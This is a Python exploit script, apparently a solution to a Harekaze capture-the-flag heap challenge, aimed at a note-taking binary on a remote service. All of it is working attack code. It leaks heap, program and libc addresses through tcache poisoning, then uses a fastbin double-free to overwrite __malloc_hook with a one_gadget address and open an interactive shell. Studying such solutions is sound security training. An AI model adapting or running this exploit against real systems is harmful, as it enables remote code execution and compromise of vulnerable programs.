from ptrlib import *

def create(title):
    sock.recvuntil("Choice: ")
    sock.sendline("1")
    sock.recvuntil("Title: ")
    sock.sendline(title)

def write(title, size, data):
    sock.recvuntil("Choice: ")
    sock.sendline("2")
    sock.recvuntil("content: ")
    sock.sendline(title)
    sock.recvuntil("content: ")
    sock.sendline(str(size))
    sock.recvuntil("Content: ")
    sock.sendline(data)

def show(title):
    sock.recvuntil("Choice: ")
    sock.sendline("3")
    sock.recvuntil("content: ")
    sock.sendline(title)
    return sock.recvline().rstrip()

def delete(title):
    sock.recvuntil("Choice: ")
    sock.sendline("4")
    sock.recvuntil("delete: ")
    sock.sendline(title)

elf = ELF("./note")
#"""
libc = ELF("./libc.so.6")
one_gadget = 0x106ef8
sock = Socket("problem.harekaze.com", 20003)
#"""
"""
libc = ELF("./test/libc.so.6")
one_gadget = 0xdf991
sock = Socket("localhost", 4001)
#"""

## leak heap address
create("A")
create("B")
write("A", 0x28, "Hello")
write("B", 0x28, "Hello")
delete("A")
delete("B")
create("A")
addr_heap = u64(show("A"))
dump("addr heap = " + hex(addr_heap))

## leak proc base
create("X")
create("X2")
write("X", 0x28, b"A" * 0x20 + p64(addr_heap + 0x78)) # fake chunk
delete("X")
# now: tcache --> (X) --> (X->content) --> ...
create("X")
create("Y") # pon!
proc_base = u64(show("Y")) - 0x4080
dump("proc base = " + hex(proc_base))

## leak libc base
create("P")
write("P", 0x28, b"A" * 0x20 + p64(proc_base + elf.got("puts")))
delete("P")
# now: tcache --> (P) --> (P->content) --> ...
create("P")
create("Q") # pon!
libc_base = u64(show("Q")) - libc.symbol("puts")
dump("libc base = " + hex(libc_base))

## fastbin corruption attack
for i in range(7):
    create("dummy" + str(i))
    write("dummy" + str(i), 0x38, "pon")
create("AAAA")
write("AAAA", 0x38, "Hello")
create("BBBB")
write("BBBB", 0x38, "World")
for i in range(7):
    delete("dummy" + str(i))
for i in range(7):
    create("DUMMY" + str(i))
delete("AAAA")
create("AAAA")
delete("BBBB")
delete("AAAA")
# now: fastbin --> (AAAA->content) --> (BBBB->content) --> (AAAA->content)
for i in range(7):
    create("consume" + str(i))
for i in range(7):
    create("CONSUME" + str(i))
    write("CONSUME" + str(i), 0x38, "bye")
# dup
create("TARGET1")
write("TARGET1", 0x38, p64(libc_base + libc.symbol("__malloc_hook")))
create("TARGET2")
write("TARGET2", 0x38, "nope")
create("TARGET3")
write("TARGET3", 0x38, "nope")
create("GOAL")
write("GOAL", 0x38, p64(libc_base + one_gadget))

sock.interactive()
